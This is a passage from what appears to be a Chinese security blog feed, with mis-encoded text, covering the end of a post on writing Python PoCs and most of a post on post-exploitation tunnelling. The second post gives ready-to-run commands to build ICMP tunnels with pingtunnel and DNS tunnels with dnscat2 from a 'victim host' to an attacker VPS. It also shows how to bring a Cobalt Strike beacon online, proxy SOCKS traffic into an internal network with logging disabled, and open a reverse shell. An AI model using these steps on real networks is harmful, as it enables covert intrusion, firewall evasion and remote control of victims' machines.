class="built_in">open</span>(<span class="string">&#x27;file.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">        <span class="built_in">print</span>(line)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰“å¼€æ–‡ä»¶è¿›è¡Œå†™å…¥</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;file.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(<span class="string">&#x27;Hello, World!\n&#x27;</span>)</span><br><span class="line">    file.write(<span class="string">&#x27;This is a new line.\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰“å¼€æ–‡ä»¶è¿›è¡Œè¿½åŠ </span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;file.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(<span class="string">&#x27;This is an additional line.\n&#x27;</span>)</span><br></pre></td></tr></table></figure></div><h2 id="å…«ã€å‚è€ƒ"><a href="#å…«ã€å‚è€ƒ" class="headerlink" title="å…«ã€å‚è€ƒ"></a>å…«ã€å‚è€ƒ</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/BrucessKING/CVE-2021-36749/blob/main/CVE-2021-36749.py</span><br><span class="line">https://github.com/dorkerdevil/CVE-2021-36749/blob/main/CVE-2021-36749.py</span><br><span class="line">https://github.com/zhzyker/exphub/blob/master/weblogic/cve-2020-14882_rce.py</span><br><span class="line">https://blog.csdn.net/caiqiiqi/article/details/115299924</span><br><span class="line">https://blog.riskivy.com/weblogic-cve-2018-2894/</span><br></pre></td></tr></table></figure></div><blockquote><p>æœ¬æ–‡ä¸­æä¾›çš„ PoC å’Œæ¼æ´éªŒè¯ä¿¡æ¯ä»…ä¾›æ•™è‚²å’Œç ”ç©¶ç›®çš„ã€‚ä½¿ç”¨æ­¤ä¿¡æ¯æ—¶ï¼Œè¯»è€…åº”è¯¥éµå®ˆæ‰€æœ‰é€‚ç”¨çš„æ³•å¾‹æ³•è§„å’Œé“å¾·è§„èŒƒã€‚ä½œè€…å¯¹ä»»ä½•å› ä½¿ç”¨æˆ–æ»¥ç”¨æ­¤ä¿¡æ¯è€Œå¯¼è‡´çš„ä»»ä½•æŸå¤±æˆ–æŸå®³æ¦‚ä¸è´Ÿè´£ã€‚è¯»è€…åº”è‡ªè¡Œæ‰¿æ‹…ä½¿ç”¨æ­¤ä¿¡æ¯çš„é£é™©å’Œè´£ä»»ã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ä»£ç ç¼–ç¨‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> POCç¼–å†™ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘ç»œéš§é“ï¼šçªç ´å†…ç½‘çš„é€šè¡Œè¯</title>
      <link href="/2023/05/07/%E7%BD%91%E7%BB%9C%E9%9A%A7%E9%81%93%EF%BC%9A%E7%AA%81%E7%A0%B4%E5%86%85%E7%BD%91%E7%9A%84%E9%80%9A%E8%A1%8C%E8%AF%81/"/>
      <url>/2023/05/07/%E7%BD%91%E7%BB%9C%E9%9A%A7%E9%81%93%EF%BC%9A%E7%AA%81%E7%A0%B4%E5%86%85%E7%BD%91%E7%9A%84%E9%80%9A%E8%A1%8C%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p>å†…ç½‘éš§é“ï¼ˆIntranet tunnelï¼‰æŒ‡çš„æ˜¯é€šè¿‡ç½‘ç»œéš§é“çš„æ–¹å¼ï¼Œå°†å†…ç½‘çš„æœåŠ¡æ˜ å°„åˆ°å…¬ç½‘ä¸Šï¼Œä»è€Œä½¿å¾—å¤–éƒ¨ä¸»æœºå¯ä»¥è®¿é—®å†…ç½‘èµ„æºã€‚åœ¨åæ¸—é€é˜¶æ®µï¼Œå†…ç½‘éš§é“çš„æ­å»ºå¯ä»¥å¸®åŠ©æ”»å‡»è€…åœ¨å†…éƒ¨ç½‘ç»œä¸­è¿›è¡Œæ›´åŠ éšè”½å’Œçµæ´»çš„æ“ä½œï¼Œä»è€Œæ›´å¥½åœ°å®ç°æ”»å‡»ç›®æ ‡ã€‚ç½‘ç»œéš§é“è¿˜å¯ä»¥æ›´å¥½çš„å¸®åŠ©æˆ‘ä»¬ç»•è¿‡å†…ç½‘é˜²å¾¡ã€æ¨ªå‘æ¸—é€ã€æ•°æ®è½¬ç§»ã€éšè—æ”»å‡»è¡Œä¸ºï¼Œæœ¬æ–‡ç®€å•ä»‹ç»å‡ ç§ç±»å‹çš„éš§é“æ­å»ºã€‚</p><h2 id="äºŒã€ICMPéš§é“"><a href="#äºŒã€ICMPéš§é“" class="headerlink" title="äºŒã€ICMPéš§é“"></a>äºŒã€ICMPéš§é“</h2><p>ICMPï¼ˆInternet Control Message Protocolï¼‰Internet æ§åˆ¶æŠ¥æ–‡åè®®ï¼Œç”¨äºåœ¨ IP ä¸»æœºã€è·¯ç”±å™¨ä¹‹é—´ä¼ é€’æ§åˆ¶æ¶ˆæ¯ã€‚æ§åˆ¶æ¶ˆæ¯æ˜¯æŒ‡ç½‘ç»œé€šä¸é€šã€ä¸»æœºæ˜¯å¦å¯è¾¾ã€è·¯ç”±æ˜¯å¦å¯ç”¨ç­‰ç½‘ç»œæœ¬èº«çš„æ¶ˆæ¯ã€‚ICMP é€šè¿‡ PING å‘½ä»¤è®¿é—®è¿œç¨‹è®¡ç®—æœºï¼Œå»ºç«‹ ICMP éš§é“ï¼Œå°† TCP&#x2F;UDP æ•°æ®å°è£…åˆ° ICMP çš„ PING æ•°æ®åŒ…ä¸­ï¼Œä»è€Œç©¿è¿‡é˜²ç«å¢™ï¼Œå› ä¸ºé˜²ç«å¢™ä¸€èˆ¬ä¸ä¼šå±è”½ PING æ•°æ®åŒ…ï¼Œå®ç°ä¸å—é™åˆ¶çš„è®¿é—®ã€‚</p><h3 id="éš§é“æ­å»º"><a href="#éš§é“æ­å»º" class="headerlink" title="éš§é“æ­å»º"></a>éš§é“æ­å»º</h3><p>ICMP éš§é“æ­å»ºä½¿ç”¨ Pingtunnelï¼Œé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a> ï¼ŒPingtunnel æŠŠ tcp&#x2F;udp&#x2F;sock5 æµé‡ä¼ªè£…æˆ icmp æµé‡è¿›è¡Œè½¬å‘çš„å·¥å…·ï¼Œè·¨å¹³å°ã€‚</p><p>1ã€æœåŠ¡ç«¯ï¼ˆvpsï¼‰ä¸Šå¼€å¯ pingtunnel æœåŠ¡ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨æ²¡æœ‰å®¢æˆ·ç«¯è¿æ¥æ—¶ï¼Œæ¥æ”¶åˆ°çš„æ•°æ®åŒ…ä¸º 0</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ./pingtunnel -type server -key [å¯†é’¥,åªé™æ•°å­—]</span><br><span class="line">sudo ./pingtunnel -type server -key 000000</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230419155830971.png" data-caption="image-20230419155830971"><img src="/../images/tunnel/image-20230419155830971.png" alt="image-20230419155830971"></a></p><p>2ã€å®¢æˆ·ç«¯ï¼ˆå—å®³ä¸»æœºï¼‰å¼€å¯ pingtunenl æœåŠ¡ï¼Œè¿æ¥æœåŠ¡ç«¯</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pingtunnel.exe -type client -l :[è½¬å‘æœ¬æœº2222ç«¯å£ä½œä¸ºICMPéš§é“é€šè®¯ç«¯å£] -s [æœåŠ¡ç«¯IP] -[è½¬å‘ç±»å‹] 1 -noprint 1 -nolog 1</span><br><span class="line">pingtunnel.exe -type client -l :2222 -s 1.x.x.x -sock5 1 -noprint 1 -nolog 1</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230419160801304.png" data-caption="image-20230419160801304"><img src="/../images/tunnel/image-20230419160801304.png" alt="image-20230419160801304"></a></p><p>æœåŠ¡ç«¯æ¥æ”¶åˆ°æ•°æ®ï¼Œéš§é“æ­å»ºæˆåŠŸ</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230419160251896.png" data-caption="image-20230419160251896"><img src="/../images/tunnel/image-20230419160251896.png" alt="image-20230419160251896"></a></p><p>å°†ICMPæµé‡è½¬å‘ä¸ºå…¶å®ƒåè®®å‘½ä»¤</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># ICMPè½¬å‘ä¸ºTCP</span><br><span class="line">pingtunnel.exe -type client -l :4455 -s www.yourserver.com -t www.yourserver.com:4455 -tcp 1</span><br><span class="line"></span><br><span class="line"># ICMPè½¬å‘ä¸ºUDP</span><br><span class="line">pingtunnel.exe -type client -l :4455 -s www.yourserver.com -t www.yourserver.com:4455</span><br></pre></td></tr></table></figure></div><p>ICMP éš§é“æµé‡å¦‚ä¸‹</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430175858624.png" data-caption="image-20230430175858624"><img src="/../images/tunnel/image-20230430175858624.png" alt="image-20230430175858624"></a></p><br/><h3 id="åˆ©ç”¨æ–¹å¼"><a href="#åˆ©ç”¨æ–¹å¼" class="headerlink" title="åˆ©ç”¨æ–¹å¼"></a>åˆ©ç”¨æ–¹å¼</h3><h4 id="Pingtunnelä¸Šçº¿Cobaltstrike"><a href="#Pingtunnelä¸Šçº¿Cobaltstrike" class="headerlink" title="Pingtunnelä¸Šçº¿Cobaltstrike"></a>Pingtunnelä¸Šçº¿Cobaltstrike</h4><p>1ã€æŒ‰ç…§ä¸Šé¢æ­¥éª¤ï¼Œå…ˆåˆ©ç”¨ Pingtunnel æ­å»º ICMP éš§é“</p><p>æœåŠ¡ç«¯ï¼ˆvpsï¼‰</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./pingtunnel -type server -key 000000(è¿æ¥å¯†ç ,åªé™æ•°å­—)</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430175950882.png" data-caption="image-20230430175950882"><img src="/../images/tunnel/image-20230430175950882.png" alt="image-20230430175950882"></a></p><p>å®¢æˆ·ç«¯ï¼ˆå—å®³ä¸»æœºï¼‰ï¼Œè¿™è¾¹éœ€è¦å°† ICMP è½¬å‘ä¸º TCP</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pingtunnel.exe -type client -l [æœ¬æœºIPï¼šICMPéš§é“ç«¯å£] -s [æœåŠ¡ç«¯IP_VPS] -t [æœåŠ¡ç«¯IP_VPS:ICMPéš§é“è½¬å‘è‡³VPSçš„ç«¯å£] -tcp 1 -noprint 1 -nolog 1 -key [å¯†é’¥]</span><br><span class="line">pingtunnel.exe -type client -l 127.0.0.1:2222 -s 1.x.x.x -t x.x.x.x:3333 -tcp 1 -noprint 1 -nolog 1 -key 000000</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430180113881.png" data-caption="image-20230430180113881"><img src="/../images/tunnel/image-20230430180113881.png" alt="image-20230430180113881"></a></p><p>2ã€Cobaltstrike æ–°å»ºä¸¤ä¸ªç›‘å¬ï¼Œä¸€ä¸ªä¸ºè½¬å‘ ICMP çš„ 2222 ç«¯å£ host ä¸º 127.0.0.1ï¼ˆè¿™ä¸ªä¸»è¦ç”¨äºç”Ÿæˆæœ¬åœ°åœ°å€çš„ beaconï¼‰ï¼Œå¦ä¸€ä¸ªç›‘å¬ç«¯å£ä¸º ICMP æµé‡è½¬å‘åˆ° VPS çš„æœåŠ¡ç«¯å£ 3333ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430180236000.png" data-caption="image-20230430180236000"><img src="/../images/tunnel/image-20230430180236000.png" alt="image-20230430180236000"></a></p><p>ç”Ÿæˆ cs é©¬</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430180319548.png" data-caption="image-20230430180319548"><img src="/../images/tunnel/image-20230430180319548.png" alt="image-20230430180319548"></a></p><p>å—å®³ä¸»æœºæ‰§è¡Œ beaconï¼Œç”±äº Cobaltstrike é©¬ç›‘å¬çš„ç«¯å£æ˜¯ 2222 ï¼Œé©¬å„¿æµé‡é€šè¿‡ 2222 ç«¯å£ï¼Œå³ ICMP éš§é“ç«¯å£è½¬å‘å‡ºå»ï¼Œåˆ°äº†æœåŠ¡ç«¯ï¼ˆVPSï¼‰ä¸Šï¼Œç„¶å ICMP ä¸Šçš„æµé‡é€šè¿‡ 2222 è½¬å‘åˆ° 3333 ç«¯å£ï¼Œå®ç°é—´æ¥ä¸Šçº¿ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230421160516688.png" data-caption="image-20230421160516688"><img src="/../images/tunnel/image-20230421160516688.png" alt="image-20230421160516688"></a></p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430180515064.png" data-caption="image-20230430180515064"><img src="/../images/tunnel/image-20230430180515064.png" alt="image-20230430180515064"></a></p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430180805743.png" data-caption="image-20230430180805743"><img src="/../images/tunnel/image-20230430180805743.png" alt="image-20230430180805743"></a></p><br/><h4 id="Pingtunel-é…åˆ-iox-ä»£ç†-socks-å‡ºç½‘"><a href="#Pingtunel-é…åˆ-iox-ä»£ç†-socks-å‡ºç½‘" class="headerlink" title="Pingtunel é…åˆ iox ä»£ç† socks å‡ºç½‘"></a>Pingtunel é…åˆ iox ä»£ç† socks å‡ºç½‘</h4><p>Pingtunnel æ­å»ºå®Œ ICMP éš§é“åï¼Œé€šè¿‡ iox é…åˆä»£ç† Socks5 å‡ºç½‘ï¼Œä»¥è¾¾åˆ°å†…ç½‘ç©¿é€ã€‚</p><p>1ã€æœåŠ¡ç«¯ï¼ˆVPSï¼‰ï¼ŒPingtunnel æ­å»º ICMP éš§é“ï¼Œè¿™é‡Œé€‰æ‹©ä¸æ‰“å°æ—¥å¿—</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./pingtunnel -type server -noprint 1 -nolog 1 -key 000000</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230423100812628.png" data-caption="image-20230423100812628"><img src="/../images/tunnel/image-20230423100812628.png" alt="image-20230423100812628"></a></p><p>2ã€å®¢æˆ·ç«¯ï¼ˆå—å®³ä¸»æœºï¼‰ï¼Œå¯åŠ¨ Pingtunnel ï¼Œæ‰“é€š ICMP éš§é“ï¼ˆæ³¨æ„ ICMP è½¬å‘æ–¹å¼ä¸º TCPï¼‰</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pingtunnel.exe -type client -l [æœ¬æœºIPï¼šICMPéš§é“ç«¯å£] -s [æœåŠ¡ç«¯IP_VPS] -t [æœåŠ¡ç«¯IP_VPS:ICMPéš§é“è½¬å‘è‡³VPSçš„ç«¯å£] -tcp 1 -noprint 1 -nolog 1 -key [å¯†é’¥]</span><br><span class="line">pingtunnel.exe -type client -l 127.0.0.1:3389 -s 1.x.x.x -t 1.x.x.x:3333 -tcp 1 -noprint 1 -nolog 1 -key 000000</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430180930005.png" data-caption="image-20230430180930005"><img src="/../images/tunnel/image-20230430180930005.png" alt="image-20230430180930005"></a></p><p>3ã€æœåŠ¡ç«¯ï¼ˆVPSï¼‰ï¼Œå¯åŠ¨ iox æœåŠ¡ç«¯ï¼Œæ¥æ”¶ä» 3333 ç«¯å£çš„æµé‡è½¬å‘è‡³ 4444 ç«¯å£</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./iox proxy -l 3333 -l 4444</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230423104609449.png" data-caption="image-20230423104609449"><img src="/../images/tunnel/image-20230423104609449.png" alt="image-20230423104609449"></a></p><p>4ã€å®¢æˆ·ç«¯ï¼ˆå—å®³è€…ï¼‰ï¼Œå¯åŠ¨ iox å®¢æˆ·ç«¯ï¼Œå°† 3389 æµé‡è½¬å‘å‡ºç½‘ï¼Œç”±äº 3389 å·²å»ºç«‹ ICMP éš§é“ï¼Œæ‰€ä»¥ iox ä»£ç†çš„ Socks æµé‡å°†é€šè¿‡ ICMP éš§é“å‡ºç½‘ã€‚</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iox.exe proxy -r 127.0.0.1:3389</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230423104802107.png" data-caption="image-20230423104802107"><img src="/../images/tunnel/image-20230423104802107.png" alt="image-20230423104802107"></a></p><p>æœåŠ¡ç«¯æ¥æ”¶åˆ°ä¿¡æ¯ï¼ŒæˆåŠŸå»ºç«‹é€šè®¯</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430181009608.png" data-caption="image-20230430181009608"><img src="/../images/tunnel/image-20230430181009608.png" alt="image-20230430181009608"></a></p><p>5ã€é€šè¿‡ proxifier ä»£ç† socks æµé‡ï¼Œå®ç°æœ¬æœºè®¿é—®å†…ç½‘</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230423105015390.png" data-caption="image-20230423105015390"><img src="/../images/tunnel/image-20230423105015390.png" alt="image-20230423105015390"></a></p><p>æœªè¿›è¡Œä»£ç†æ—¶ï¼Œæœ¬æœºæ— æ³•è®¿é—®å†…ç½‘èµ„æº</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230423100206006.png" data-caption="image-20230423100206006"><img src="/../images/tunnel/image-20230423100206006.png" alt="image-20230423100206006"></a></p><p>ä»£ç†åï¼Œæœ¬æœºå¯è®¿é—®å†…ç½‘èµ„æº</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230423100458787.png" data-caption="image-20230423100458787"><img src="/../images/tunnel/image-20230423100458787.png" alt="image-20230423100458787"></a></p><h2 id="ä¸‰ã€DNS-éš§é“æ­å»º"><a href="#ä¸‰ã€DNS-éš§é“æ­å»º" class="headerlink" title="ä¸‰ã€DNS éš§é“æ­å»º"></a>ä¸‰ã€DNS éš§é“æ­å»º</h2><p>DNS éš§é“æ˜¯å°†å…¶å®ƒåè®®çš„å†…å®¹å°è£…åœ¨ DNS åè®®ä¸­ï¼Œä»¥ DNS è¯·æ±‚å’Œå“åº”åŒ…å®Œæˆä¼ è¾“æ•°æ®çš„æŠ€æœ¯ã€‚ä½¿ç”¨ DNS éš§é“éœ€è¦ä½¿ç”¨ä¸€ä¸ªå­åŸŸåæ¥è¿›è¡Œéš§é“é€šä¿¡ï¼Œè€Œä¸èƒ½ç›´æ¥ä½¿ç”¨ä¸»åŸŸåï¼Œå› ä¸º DNS éš§é“çš„å·¥ä½œåŸç†æ˜¯å°†éš§é“æ•°æ®é€šè¿‡ DNS åè®®ä¼ è¾“ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨ä¸€ä¸ªç‹¬ç«‹çš„å­åŸŸåæ¥è¿›è¡Œé€šä¿¡ï¼Œä»¥é¿å…å½±å“åˆ°ä¸»åŸŸåçš„è§£æã€‚</p><h3 id="éš§é“æ­å»º-1"><a href="#éš§é“æ­å»º-1" class="headerlink" title="éš§é“æ­å»º"></a>éš§é“æ­å»º</h3><p>DNS éš§é“æ­å»ºä½¿ç”¨ dnscat2ï¼Œé¡¹ç›®åœ°å€ <a href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a></p><p>1ã€é…ç½®å­åŸŸåè§£æï¼Œå¹¶å¼€æ”¾ udpã€tcp 53ç«¯å£ï¼Œè¿™è¾¹ä½¿ç”¨è…¾è®¯äº‘è¿›è¡ŒåŸŸåé…ç½®ï¼Œå¦‚ä½•è´­ä¹°ä¸å†èµ˜è¿°ï¼Œè´­ä¹°å®ŒåŸŸååï¼Œç›´æ¥æœç´¢ DNS è¿›å…¥ <code>DNS è§£æ DNSPod</code>ï¼Œå¯¹åŸŸåæ·»åŠ è®°å½• A è®°å½•ä»¥åŠ NS è®°å½•ã€‚è¯¥ä½œç”¨æ˜¯ï¼šå°†NS è®°å½•çš„ log.xxx.xxx å­åŸŸåä¸‹æ‰€æœ‰ DNS è§£æäº¤ç»™ A è®°å½•çš„ ns1.xxx.xxx å¤„ç†ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430181535026.png" data-caption="image-20230430181535026"><img src="/../images/tunnel/image-20230430181535026.png" alt="image-20230430181535026"></a></p><p>å¼€æ”¾ udpã€tcp 53ç«¯å£</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230424093842332.png" data-caption="image-20230424093842332"><img src="/../images/tunnel/image-20230424093842332.png" alt="image-20230424093842332"></a></p><p>éªŒè¯åŸŸåè§£æè®¾ç½®æ˜¯å¦æˆåŠŸï¼Œèƒ½æ­£å¸¸ PING åŸŸåï¼Œè§£ææ­£å¸¸</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430181644239.png" data-caption="image-20230430181644239"><img src="/../images/tunnel/image-20230430181644239.png" alt="image-20230430181644239"></a></p><p>ç„¶ååœ¨ VPS ä¸Šä½¿ç”¨ tcpdump ç›‘å¬ udp 53 ç«¯å£ï¼ˆubuntu ä¸Šå®‰è£… tcpdump ï¼šsudo apt-get install tcpdumpï¼‰</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -n -i eth0 udp dst port 53</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230424093927718.png" data-caption="image-20230424093927718"><img src="/../images/tunnel/image-20230424093927718.png" alt="image-20230424093927718"></a></p><p>ä½¿ç”¨æœ¬åœ°ç”µè„‘ nslookup NS è®°å½•å€¼ï¼Œè‹¥ vps ä¸Š tcpdump è¿”å›æŸ¥è¯¢ä¿¡æ¯åˆ™è¯æ˜ç¯å¢ƒæ­£å¸¸</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430181752847.png" data-caption="image-20230430181752847"><img src="/../images/tunnel/image-20230430181752847.png" alt="image-20230430181752847"></a></p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430181955810.png" data-caption="image-20230430181955810"><img src="/../images/tunnel/image-20230430181955810.png" alt="image-20230430181955810"></a>1</p><p>3ã€æœåŠ¡ç«¯é…ç½® dnscat2 è¿™è¾¹ä½¿ç”¨å…¬ç½‘ ubuntu ä½œä¸ºæœåŠ¡ç«¯ï¼Œæ³¨æ„ï¼šä½¿ç”¨å‰æŸ¥çœ‹ç³»ç»Ÿæ˜¯å¦æœ‰ç¨‹åºå ç”¨ TCP å’Œ UDP çš„ 53 ç«¯å£ï¼Œè‹¥æœ‰ï¼Œéœ€è¦å…ˆæš‚åœè¯¥ç¨‹åº ï¼ŒUbuntu ä¸Š systemd-resolved ä¼šå ç”¨ 53 ç«¯å£ï¼Œä»¥ä¸‹å‘½ä»¤èƒ½æš‚åœæœåŠ¡</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service systemd-resolved stop# åœæ­¢ systemd-resolved æœåŠ¡</span><br><span class="line">systemctl disable systemd-resolved# è®¾ç½®å¼€æœºä¸å¯åŠ¨</span><br></pre></td></tr></table></figure></div><p>å®‰è£… dnscat2</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/iagox86/dnscat2</span><br><span class="line">cd dnscat2/server</span><br><span class="line">apt install gem ruby-dev libpq-dev</span><br><span class="line">gem install bundler</span><br><span class="line">bundle config mirror.https://rubygems.org https://mirrors.tuna.tsinghua.edu.cn/rubygems</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure></div><p>æœåŠ¡ç«¯ï¼ˆvpsï¼‰ï¼Œå¯åŠ¨ dnscat2 æœåŠ¡</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd dnscat2/server</span><br><span class="line">sudo ruby dnscat2.rb [NSä¸Šæœºè®°å½•.åŸŸå] -c [å¯†é’¥]</span><br><span class="line">sudo ruby dnscat2.rb log.xxx.xxx -c 000000</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430182353337.png" data-caption="image-20230430182353337"><img src="/../images/tunnel/image-20230430182353337.png" alt="image-20230430182353337"></a></p><p>4ã€é…ç½®å®¢æˆ·ç«¯ï¼ŒäºŒè¿›åˆ¶æ–‡ä»¶ä¸‹è½½åœ°å€ï¼š<a href="https://downloads.skullsecurity.org/dnscat2/">https://downloads.skullsecurity.org/dnscat2/</a> ï¼Œå®¢æˆ·ç«¯ï¼ˆå—å®³ä¸»æœºï¼‰å¯åŠ¨ dnscat2 æœåŠ¡</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dnscat2-v0.07-client-win32.exe --secret=[å¯†é’¥] [NS è®°å½•å€¼] --delay 5000</span><br><span class="line">dnscat2-v0.07-client-win32.exe --secret=000000 log.xxx.xxx --delay 5000</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430182441235.png" data-caption="image-20230430182441235"><img src="/../images/tunnel/image-20230430182441235.png" alt="image-20230430182441235"></a></p><p>5ã€æŸ¥çœ‹æœåŠ¡ç«¯ï¼Œè¿”å›ä¸€ä¸ª session ç±»ä¼¼ msf ä¸€èˆ¬</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430182555251.png" data-caption="image-20230430182555251"><img src="/../images/tunnel/image-20230430182555251.png" alt="image-20230430182555251"></a></p><p>ä½¿ç”¨ <code>session -i 1</code> æˆ–è€… <code>window -i 1</code> è¿›å…¥ shell</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230425105649239.png" data-caption="image-20230425105649239"><img src="/../images/tunnel/image-20230425105649239.png" alt="image-20230425105649239"></a></p><p>æ‰§è¡Œ <code>shell</code> å‘½ä»¤ï¼Œè·å–å—å®³è€…ä¸»æœºåå¼¹ <code>shell</code></p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230425105802478.png" data-caption="image-20230425105802478"><img src="/../images/tunnel/image-20230425105802478.png" alt="image-20230425105802478"></a></p><p>æ‰§è¡Œ session -i 2 è¿›å…¥åå¼¹ shell ç»ˆç«¯</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230425105902471.png" data-caption="image-20230425105902471"><img src="/../images/tunnel/image-20230425105902471.png" alt="image-20230425105902471"></a></p><p>DNSéš§é“æµé‡å¦‚ä¸‹ï¼Œä¸­ç»§æ¨¡å¼æ²¡æœ‰ dnscat å…³é”®å­—ï¼Œä½†ä¼šæš´éœ²åŸŸåä¿¡æ¯ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/tunnel/image-20230430182842692.png" data-caption="image-20230430182842692"><img src="/../images/tunnel/image-20230430182842692.png" 